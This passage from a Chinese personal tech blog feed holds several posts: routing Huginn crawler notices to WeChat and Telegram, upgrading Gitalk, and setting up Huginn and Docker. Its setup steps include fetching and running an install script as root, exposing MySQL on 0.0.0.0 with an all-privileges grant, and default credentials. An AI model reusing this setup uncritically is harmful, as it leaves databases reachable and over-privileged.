operator">:</span> <span class="token string">"html"</span><span class="token punctuation">,</span>  <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>  <span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".wp_articlecontent"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"."</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"content"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> content | strip_html <span class="token punctuation">}</span><span class="token punctuation">}</span>"  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="将通知推送到微信"><a href="#将通知推送到微信" class="headerlink" title="将通知推送到微信"></a>将通知推送到微信</h2><p><strong>Crawler_AAO #3 WeChat Push</strong></p><p>这里利用Server Chan提供的微信模板消息推送服务，之前也写过一篇：<a href="https://miaotony.xyz/2019/03/07/Idea_PushBearAPI_WeChatPush/">小想法 | 基于PushBear API实现微信消息推送</a>。这次再来用一下呢。</p><p>现在 PushBear 一对多的推送需要绑定认证过的服务号了，但是个人的推送还是可以用的。</p><p>这次用的就是Huginn里的<strong>Post Agent</strong>啦。</p><h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>这个Agent的<code>method</code>可以是<code>get</code>, <code>post</code>, <code>put</code>, <code>patch</code>, and <code>delete</code>，基本的都能实现。</p><p>Server Chan那边说是用GET，但好像POST也行。</p><h3 id="post-url"><a href="#post-url" class="headerlink" title="post_url"></a>post_url</h3><p>填写Server Chan的API地址，<code> https://sc.ftqq.com/{% credential YourServerChanAPI %}.send? </code></p><p>这里把API保存到了Credentials里，直接用Liquid模板调用就好了。</p><h3 id="content-type"><a href="#content-type" class="headerlink" title="content_type"></a>content_type</h3><p>这里用form（<code>application/x-www-form-urlencoded</code>）。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>API接口有两个参数，标题<code>text</code>（必须），描述<code>desp</code>（可选），支持Markdown语法。</p><p>这里自己定义就好了啦~ 怎么开心怎么来嘻嘻嘻。</p><pre class=" language-json"><code class="language-json"><span class="token property">"payload"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"【{{title}}】"</span><span class="token punctuation">,</span>    <span class="token property">"desp"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> url <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span>% line_break %<span class="token punctuation">}</span><span class="token punctuation">{</span>% line_break %<span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> content | replace<span class="token operator">:</span> \<span class="token string">"\n\", \"\n\n\" }}"</span><span class="token punctuation">}</span></code></pre><p><strong>要注意的是：</strong>如果直接在它的模板里修改参数信息，则<strong>带有<code>\</code>的会自动转义为<code>\\</code></strong>！</p><p>因此直接写<code>\n</code>不可行，而要点击<strong>Toggle View</strong>然后直接写<code>\n</code>。或者也可以调用 Huginn 提供的方法 <code> {% line_break %} </code> 。</p><p>另一个问题，<strong>在Server Chan中<code>\n\n</code>才能换行</strong>，于是利用 Liquid 的<code> {{ content | replace: \"\n\", \"\n\n\" }} </code> 把<code>\n</code>给替换成<code>\n\n</code>。（需要直接写，不能直接在参数的框里改。</p><p>还要注意保存后如果再次修改则<code>\n</code>又会自动变为<code>\\n</code>，注意留意。建议保存之前先<strong>Dry Run</strong>试试。</p><h3 id="emit-events"><a href="#emit-events" class="headerlink" title="emit_events"></a>emit_events</h3><p>如果设为<code>true</code>，则会返回一个Event，可以再加一个Agent来判断是否发送成功。</p><p>例如某次发送成功后得到的Event如下，其中的body部分为返回的数据。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"body"</span><span class="token operator">:</span> <span class="token property">"{\"errno\":0,\"errmsg\":\"success\",\"dataset\"</span><span class="token operator">:</span>\<span class="token string">"done\"}"</span><span class="token punctuation">,</span>  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"Server"</span><span class="token operator">:</span> <span class="token string">"nginx"</span><span class="token punctuation">,</span>    <span class="token property">"Date"</span><span class="token operator">:</span> <span class="token string">"Tue, 10 Feb 2020 09:00:51 GMT"</span><span class="token punctuation">,</span>    <span class="token property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"text/html;charset=utf-8"</span><span class="token punctuation">,</span>    <span class="token property">"Transfer-Encoding"</span><span class="token operator">:</span> <span class="token string">"chunked"</span><span class="token punctuation">,</span>    <span class="token property">"Connection"</span><span class="token operator">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">,</span>    <span class="token property">"Expires"</span><span class="token operator">:</span> <span class="token string">"Thu, 01 Jan 1970 00:00:01 GMT"</span><span class="token punctuation">,</span>    <span class="token property">"Cache-Control"</span><span class="token operator">:</span> <span class="token string">"no-cache, must-revalidate"</span><span class="token punctuation">,</span>    <span class="token property">"Pragma"</span><span class="token operator">:</span> <span class="token string">"no-cache"</span><span class="token punctuation">,</span>    <span class="token property">"Via"</span><span class="token operator">:</span> <span class="token string">"100167"</span><span class="token punctuation">,</span>    <span class="token property">"Set-Cookie"</span><span class="token operator">:</span> <span class="token string">"PHPSESSID=xxxxxxxxxx; expires=Wed, 11-Feb-2020 09:00:51 GMT; path=/; domain=sc.ftqq.com; HttpOnly"</span><span class="token punctuation">,</span>    <span class="token property">"Content-Length"</span><span class="token operator">:</span> <span class="token number">47</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="将通知推送到Telegram-Channel"><a href="#将通知推送到Telegram-Channel" class="headerlink" title="将通知推送到Telegram Channel"></a>将通知推送到Telegram Channel</h2><p><strong>Crawler_AAO #3 Telegram Channel Push</strong></p><p>同样使用的是<strong>Post Agent</strong>。<em>（看了一下，Telegram Agent好像不大灵活，而且还需要先有一个Event Formatting Agent，让Event中包含either a <code>text</code>, <code>photo</code>, <code>audio</code>, <code>document</code> or <code>video</code> key.）</em></p><p>昨天研究了好久Telegram Bot，看了看<a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">官方API文档</a>，发现没有想象中的那么困难233333。</p><p>首先 @BotFather 注册一个TGBot，得到token。</p><p>这里没有设置Webhook，只需要用到<code>sendMessage</code>方法就好了。</p><h3 id="post-url-1"><a href="#post-url-1" class="headerlink" title="post_url"></a>post_url</h3><p>URL为<code>https://api.telegram.org/bot&lt;token&gt;/sendMessage</code>，将<code>&lt;token&gt;</code>部分换成自己的Bot token，可以保存到Credentials里。</p><p>如<code>https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage</code></p><p>可以先用 PostMan 测试一下。</p><p>别忘了<code>bot</code>……<em>（是我了</em></p><h3 id="method-1"><a href="#method-1" class="headerlink" title="method"></a>method</h3><p>POST or GET</p><h3 id="content-type-1"><a href="#content-type-1" class="headerlink" title="content_type"></a>content_type</h3><ul><li><a href="https://en.wikipedia.org/wiki/Query_string" target="_blank" rel="noopener">URL query string</a></li><li>application/x-www-form-urlencoded</li><li>application/json (except for uploading files)</li><li>multipart/form-data (use to upload files)</li></ul><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>参数列表如下</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TGAPI.png" alt="API参数"></p><p>也可以使用Markdown语法。（还别说，真挺好</p><hr><p>其实还有一个问题，我部署Huginn的服务器是在墙内的，于是还需要想办法转发出去。</p><p>具体自己想办法了啦。</p><p><del>（折腾了半天用 <em>heroku</em> 搭了一个自己凑合着用</del></p><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实最初是想看看Huginn怎么用的，折腾过程中还去看了Liquid模板语法，XPath Functions用法。</p><p>推送到微信的前几天就弄好了，昨天想看看TG Bot怎么玩，于是研究了一下Bot API，顺便又写了个推送到TG Channel的。</p><p><strong>最终的效果——</strong></p><p>每隔一段时间，Huginn 就会派出一个Agent小兵，去看一看教务有没有新的通知公告。</p><p>噢来了呀！Agent带回来了一个新的Event，快把它推给主人吧！</p><p>Ding~</p><p>微信来了一条新信息。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WeChatNotification.png" alt="WeChatNotification"></p><p>TG的Channel那边也来了。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_PC.png" alt="Telegram PC端"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_Mobile.png" alt="Telegram Mobile"></p><p>嗯，这个感觉就很棒，朴实无华，且枯燥。（然而并没有钱</p><p>emmm 24号开始就要网上上课了。</p><hr><p><strong>以上内容仅供学习研究，请勿用于非法用途。</strong></p><p>噢对了，TG Channel的邀请链接在这个域名里找嘻嘻嘻——</p><p><strong><em>_tg_aaonotice.miaotony.xyz</em></strong></p><br><hr><p>就在我部署这篇文章的时候，发现所有的 非代码块内的 Liquid语言全部被hexo认为是代码了emmm</p><p>我忘记hexo也用了Liquid了。。（感觉蠢死了</p><p>于是把需要在所有的 <code>{{xxx}}</code>和<code>{% xxx %}</code>外面套一层 <code>{% raw %} ...  {% endraw %}</code><br>如果要写上面这个<code>raw</code>，需要写两个（类似于转义）。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/hexo_raw.png" alt="raw"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/hexo_raw2.png" alt="raw2"></p><hr><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><p><a href="https://github.com/huginn/huginn/wiki" target="_blank" rel="noopener">Huginn Wiki</a></p></li><li><p><a href="https://github.com/huginn/huginn/wiki/Formatting-Events-using-Liquid" target="_blank" rel="noopener">Formatting Events using Liquid</a></p></li><li><p><a href="https://liquid.bootcss.com/" target="_blank" rel="noopener">Liquid 中文文档</a></p></li><li><p><a href="https://huginnio.herokuapp.com/agents" target="_blank" rel="noopener">Huginn Agent 文档</a></p></li><li><p><a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">Telegram Bot官方API文档</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/46216545" target="_blank" rel="noopener">RSS 进阶篇：Huginn - 真·为任意网页定制 RSS 源（PhantomJs 抓取）</a></p></li><li><p><a href="https://blog.wangjiegulu.com/2018/11/16/douban_high_movie_huginn_telegram/" target="_blank" rel="noopener">Huginn 实现自动通过 Telegram 推送豆瓣高分电影</a></p></li><li><p><a href="https://www.w3.org/TR/xpath/#section-String-Functions" target="_blank" rel="noopener">XPath functions</a>（<a href="https://www.w3school.com.cn/xpath/xpath_functions.asp" target="_blank" rel="noopener">中文介绍</a>）</p><p>etc.</p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Projects </tag>
            
            <tag> Huginn </tag>
            
            <tag> Telegram </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog折腾记 | 升级Gitalk评论插件以解决EmailBombs</title>
      <link href="/2020/02/07/Blog_UpdateGitalk/"/>
      <url>/2020/02/07/Blog_UpdateGitalk/</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这几天我的邮箱被 GitHub 轰炸了emmm。</p><p>具体大概是这样的——</p><p><img src="/2020/02/07/Blog_UpdateGitalk/GitHubEmail.png" alt="GitHubEmail"></p><p><img src="/2020/02/07/Blog_UpdateGitalk/GitHubEmail2.png" alt="GitHubEmail2"></p><p>说好的</p><blockquote><p>Depending on your API usage, we’ll be sending you this email reminder at most once every 3 days.</p></blockquote><p>然而从2月4日开始每天都有一堆……</p><p><strong>所以这到底是什么回事呢？</strong></p><p>我一想，用到这个 API 的只有我博客的 Gitalk 评论插件。目前我博客的评论都放在了GitHub项目的issue里，每篇文章浏览到下面的时候会自动加载评论，这时候就会向GitHub的API发请求从而获取相应数据。</p><br><hr><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>于是去 gitalk 的官方仓库看了看，果然2月4日当天就有人提issue了，看来不少人 Email Bombs 了23333（摊手。</p><p><a href="https://github.com/gitalk/gitalk/issues/343" target="_blank" rel="noopener">https://github.com/gitalk/gitalk/issues/343</a></p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue.png" alt="issue"></p><p>很多大佬对这个问题进行了讨论，当然也有不少 <code>+1 Mark</code>之类的在旁观。</p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>2月4日这样，@geektutu 给出了一个 <strong>Use read-only personal access token to replace clientID &amp; clientSecret</strong> 的方案，并提了PR，详见：<a href="https://github.com/gitalk/gitalk/pull/344" target="_blank" rel="noopener">#344</a>。这个PR在2月6日merge了。</p><p>根据他的建议，首先需要更新 <code>gitalk.min.js</code>文件，如果想获得更多的API使用量，需要在 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">accessToken</a> 里生成一个只读的token，而后修改 Gitalk 模板里的配置，新增<code>accessToken</code>项。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> gitalk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gitalk</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  clientID<span class="token punctuation">:</span> <span class="token string">'GitHub Application Client ID'</span><span class="token punctuation">,</span>  clientSecret<span class="token punctuation">:</span> <span class="token string">'GitHub Application Client Secret'</span><span class="token punctuation">,</span>  accessToken<span class="token punctuation">:</span> <span class="token string">'Github Personal Access Token'</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">// IMPORTANT !!!</span>  repo<span class="token punctuation">:</span> <span class="token string">'GitHub repo'</span><span class="token punctuation">,</span>  owner<span class="token punctuation">:</span> <span class="token string">'GitHub repo owner'</span><span class="token punctuation">,</span>  <span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>根据 <a href="https://developer.github.com/apps/building-oauth-apps/understanding-scopes-for-oauth-apps/#available-scopes" target="_blank" rel="noopener">Understanding scopes for OAuth Apps</a> ，在<strong>新建 access token 时不选择任何选项</strong>，则生成的token只有<strong>公开信息的只读</strong>权限（<em>Grants read-only access to public information (includes public user profile info, public repository info, and gists)</em>）。</p><p>6号我也更新了这一版本，做了相应的修改，的确邮箱不被轰炸了。😂</p><p>但是，<strong>这个 access token 在任何人访问博客的时候都是公开可见的</strong>，不免存在风险，这也在issue里有过讨论。@geektutu 也说这是个临时方案。</p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue2.png" alt="issue2"></p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>2月7日，这个issue的发起者 @fletchto99 给出了他的方案，并提了PR，详见：<a href="https://github.com/gitalk/gitalk/pull/346" target="_blank" rel="noopener">gitalk/gitalk#346</a> </p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue3.png" alt="issue3"></p><p>利用原来的<code>client_id</code> 和 <code>client_secret</code> 作为 basic auth 是可行的。</p><p>按照他的方案，<strong>不需要修改其他的任何配置，直接把Gitalk的js升级到V1.5.2</strong> 即可。</p><p>这样就方便了很多哈，试了一下果然是可行的。</p><p>而且这个可以说是<strong>最佳方案</strong>了呢！</p><h2 id="针对-Matery-主题的修改"><a href="#针对-Matery-主题的修改" class="headerlink" title="针对 Matery 主题的修改"></a>针对 Matery 主题的修改</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>对于我现在使用的 <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">Matery</a> 主题（<em>hexo-theme-matery</em>），只需要将 <code>\hexo\themes\matery\source\libs\gitalk</code>目录下的 <code>gitalk.min.js</code>和 <code>gitalk.css</code> 更新到最新版本（&gt;= V1.5.2）即可。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>当然也可以修改配置文件里引用的 JavaScript（、CSS）地址为链接版本。</p><p>目前 CDN 上的 Gitalk 已经更新到了最新版本。</p><p>打开<code>\hexo\themes\matery\_config.yml</code>，修改其中的 <code>libs</code>。</p><pre class=" language-yml"><code class="language-yml">libs:  css:    # ...    gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css    # 或者 https://unpkg.com/gitalk/dist/gitalk.css    # ...  js:    # ...    gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js    # 或者 https://unpkg.com/gitalk/dist/gitalk.min.js     # ...</code></pre><p>保存后，在 hexo 的目录下执行 <code>hexo clean &amp;&amp; hexo g</code>，再部署即可。</p><hr><p>最后，顺手给 <em><a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">hexo-theme-matery</a></em> 提了个PR，更新了这一依赖，详见  <a href="https://github.com/blinkfox/hexo-theme-matery/pull/318" target="_blank" rel="noopener">blinkfox/hexo-theme-matery#318</a> 。</p><p><img src="/2020/02/07/Blog_UpdateGitalk/PR.png" alt="PR"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> Tech </tag>
            
            <tag> blog </tag>
            
            <tag> Gitalk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Docker搭建Huginn</title>
      <link href="/2020/02/03/Server_Huginn/"/>
      <url>/2020/02/03/Server_Huginn/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/02/03/Server_Huginn/Huginn.png" alt="Huginn"></p><h2 id="What-is-Huginn"><a href="#What-is-Huginn" class="headerlink" title="What is Huginn?"></a>What is Huginn?</h2><blockquote><p>Huginn is a system for building agents that perform automated tasks for  you online.  They can read the web, watch for events, and take actions  on your behalf.  Huginn’s Agents create and consume events, propagating  them along a directed graph.  Think of it as a hackable version of IFTTT or Zapier on your own server.  You always know who has your data.  You  do.</p></blockquote><blockquote><p>Huginn是一个神器，它是一个私人IFTTT，例如搭建任务采集触发平台，自动跟进实时提醒（用Email Slack Telegeram QQ  微信接收推送），全文 RSS 输出（把你关注的所有网页进行 RSS  全文输出），同时可以把各种app，软件，网络服务，网络设备等链接在一起做任务触发。 </p></blockquote><p>官方Github仓库：<a href="https://github.com/huginn/huginn" target="_blank" rel="noopener">https://github.com/huginn/huginn</a></p><p>这个是我在玩爬虫的时候，偶然间在网上看到的一个工具，能做的事情还不少，觉得还挺不错的，这次就试着搭建一下吧。  </p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>手动安装的话，需要下面这样一步步来，感觉好麻烦……（懒</p><blockquote><p>The Huginn installation consists of setting up the following components:   </p><ol><li>Packages / Dependencies</li><li>Ruby</li><li>System Users</li><li>Database</li><li>Huginn</li><li>Nginx</li></ol></blockquote><p>但是，Huginn还提供了一种通过docker来搭建的方式，可以免去配环境的烦恼，感觉贼好~</p><p>官方的文档在<a href="https://github.com/huginn/huginn/blob/master/doc/docker/install.md" target="_blank" rel="noopener">这里</a>。</p><h3 id="1-安装-Docker"><a href="#1-安装-Docker" class="headerlink" title="1. 安装 Docker"></a>1. 安装 Docker</h3><p>可以参考<a href="https://miaotony.xyz/2020/02/02/Server_Docker/">这里</a>。</p><h3 id="2-安装-Huginn"><a href="#2-安装-Huginn" class="headerlink" title="2. 安装 Huginn"></a>2. 安装 Huginn</h3><p>最简单的就直接</p><pre class=" language-bash"><code class="language-bash">docker run -it -p 3000:3000 huginn/huginn</code></pre><p>首先会把<code>huginn</code>给pull下来，然后运行。</p><p>然后访问 <a href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a> 可以看到</p><p><img src="/2020/02/03/Server_Huginn/Huginn2.png" alt="登录界面"></p><h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3. 登录"></a>3. 登录</h3><p>利用username <code>admin</code> and password <code>password</code>登录，之后可以在<code>Account</code>里进行修改。</p><p><img src="/2020/02/03/Server_Huginn/Huginn3.png" alt="登录后首页"></p><h3 id="4-配置开机自启"><a href="#4-配置开机自启" class="headerlink" title="4. 配置开机自启"></a>4. 配置开机自启</h3><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always huginn</code></pre><p>好了，接下来就可以<strong>尽情感受<code>huginn</code>的魅力</strong>了！</p><br><hr><br><h2 id="Connect-to-local-MySQL"><a href="#Connect-to-local-MySQL" class="headerlink" title="Connect to local MySQL"></a>Connect to local MySQL</h2><p>上面的安装方法是最简单的，默认会在Docker容器里安装MySQL数据库等环境。</p><p>但是如果本机就装了一个MySQL数据库，需要 huginn 共享的话，</p><p>或者说<strong>想要<code>huginn</code>连接到本地数据库</strong>，可以像下面这样安装。</p><h3 id="1-安装-Docker-1"><a href="#1-安装-Docker-1" class="headerlink" title="1. 安装 Docker"></a>1. 安装 Docker</h3><p>同上。</p><h3 id="2-配置-MySQL"><a href="#2-配置-MySQL" class="headerlink" title="2. 配置 MySQL"></a>2. 配置 MySQL</h3><h4 id="2-1-修改绑定的IP为-0-0-0-0"><a href="#2-1-修改绑定的IP为-0-0-0-0" class="headerlink" title="2.1 修改绑定的IP为 0.0.0.0"></a>2.1 修改绑定的IP为 <code>0.0.0.0</code></h4><p>这是为了让docker能连接到本地的数据库。</p><p>默认的 <code>127.0.0.1</code> 只能从本地访问。</p><p><strong>MySQL：</strong></p><pre class=" language-bash"><code class="language-bash">vim /etc/mysql/mysql.conf.d/mysqld.cnf</code></pre><p>修改</p><pre><code>bind-address = 0.0.0.0</code></pre><p>然后 重启</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysql </code></pre><p><strong>MariaDB：</strong></p><p><code>/etc/mysql/mariadb.cnf</code>包含了下面的所以<code>.cnf</code>文件</p><pre><code>!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/</code></pre><p>我这里的在下面这个文件里</p><pre class=" language-bash"><code class="language-bash">vim /etc/mysql/mariadb.conf.d/50-server.cnf</code></pre><p>同样修改 <code>bind-address = 0.0.0.0</code></p><p>而后 重启</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysql</code></pre><h4 id="2-2-MySQL里新建-huginn-用户"><a href="#2-2-MySQL里新建-huginn-用户" class="headerlink" title="2.2 MySQL里新建 huginn 用户"></a>2.2 MySQL里新建 <code>huginn</code> 用户</h4><p><strong>当然也可以让<code>huginn</code>直接以<code>root</code>用户来访问数据库，那就直接跳到2.3节。</strong></p><p>不过安全起见，还是新建一个用户吧。</p><p>以<code>root</code>登录MySQL / MariaDB</p><pre class=" language-bash"><code class="language-bash">mysql -u root -p</code></pre><p>新建<code>huginn</code>用户，密码为<code>PASSWORD</code></p><pre class=" language-mysql"><code class="language-mysql">create user 'huginn'@'%' identified by 'PASSWORD';</code></pre><p>这个是允许从任意地方登录。</p><p>如果要限制从<code>docker</code>里启动，先<code>ifconfig</code>看下 <code>docker0</code> 的IP，一般是<code>172.17.0.1</code>，则 docker IP 为<code>172.17.0.*</code>，于是</p><pre class=" language-mysql"><code class="language-mysql">create user 'huginn'@'172.17.0.%' identified by 'PASSWORD';</code></pre><h4 id="2-3-赋予权限"><a href="#2-3-赋予权限" class="headerlink" title="2.3 赋予权限"></a>2.3 赋予权限</h4><pre class=" language-mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON *.* TO 'huginn'@'172.17.0.%' IDENTIFIED BY 'PASSWORD' WITH GRANT OPTION;flush privileges;</code></pre><p>如果限制访问的数据库则修改<code>*.*</code>为相应的数据库即可。</p><h3 id="3-配置-firewall"><a href="#3-配置-firewall" class="headerlink" title="3. 配置 firewall"></a>3. 配置 firewall</h3><p>如果启用了 firewall 的话，需要放行本地的3306端口（即数据库的相应端口）。</p><p>Ubuntu：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow 3306</code></pre><p>CentOS：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>3306/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span><span class="token function">sudo</span> systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><h3 id="4-安装-Huginn"><a href="#4-安装-Huginn" class="headerlink" title="4. 安装 Huginn"></a>4. 安装 Huginn</h3><p>首次安装：</p><pre class=" language-bash"><code class="language-bash">docker run  --name huginn \    -p 3000:3000 \    --restart always \    -e MYSQL_PORT_3306_TCP_ADDR<span class="token operator">=</span>172.17.0.1 \    -e HUGINN_DATABASE_NAME<span class="token operator">=</span>huginn \    -e HUGINN_DATABASE_USERNAME<span class="token operator">=</span>huginn \    -e HUGINN_DATABASE_PASSWORD<span class="token operator">=</span>PASSWORD \    huginn/huginn</code></pre><p>这里建了一个名为<code>huginn</code>的数据库。</p><p><code>172.17.0.1</code>是本地的IP，即在<code>ifconfig</code>看到的 <code>docker0</code> 的IP。确保在本地可以通过这个IP连上数据库。</p><p>之后直接这样即可↓。</p><pre class=" language-bash"><code class="language-bash">docker start huginn</code></pre><p>上面首次安装时已经配置了开机自启。</p><p>当然也可以这样配置——</p><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always huginn</code></pre><p>好了，完工！</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/huginn/huginn" target="_blank" rel="noopener">https://github.com/huginn/huginn</a></p><p><a href="https://www.jianshu.com/p/d272a09ba686" target="_blank" rel="noopener">https://www.jianshu.com/p/d272a09ba686</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Huginn </tag>
            
            <tag> Server </tag>
            
            <tag> Docker </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker安装及常用命令</title>
      <link href="/2020/02/02/Server_Docker/"/>
      <url>/2020/02/02/Server_Docker/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/02/02/Server_Docker/docker.gif" alt="docker图标"></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Building and deploying new applications is faster with containers.<br>Docker containers wrap up software and its dependencies into a  standardized unit for software development that includes everything it  needs to run: code, runtime, system tools and libraries. This guarantees that your application will always run the same and makes collaboration  as simple as sharing a container image.</p></blockquote><blockquote><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。</p><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p></blockquote><p>其实感觉上就是emmm</p><p>别人把整套环境都配置好打包好了，你直接拿过来用就好了！</p><p>反正用起来贼方便就是了。</p><p><img src="/2020/02/02/Server_Docker/docker2.png" alt="图标"></p><p>感觉docker的图标就挺好看的（</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre class=" language-bash"><code class="language-bash">curl -fsSL get.docker.com -o get-docker.sh<span class="token function">sudo</span> sh get-docker.sh --mirror Aliyun</code></pre><p>Windows下下载Docker Desktop</p><p><a href="https://www.docker.com/products/docker-desktop" target="_blank" rel="noopener">https://www.docker.com/products/docker-desktop</a></p><p>（要登陆）</p><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>Linux下，编辑此文件，如果没有则新建。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/docker/daemon.json</code></pre><p>Windows下文件为：</p><pre><code>%programdata%\docker\config\daemon.json</code></pre><h3 id="USTC-中科大源（推荐！）"><a href="#USTC-中科大源（推荐！）" class="headerlink" title="USTC 中科大源（推荐！）"></a>USTC 中科大源<strong>（推荐！）</strong></h3><p><a href="https://lug.ustc.edu.cn/wiki/mirrors/help/docker" target="_blank" 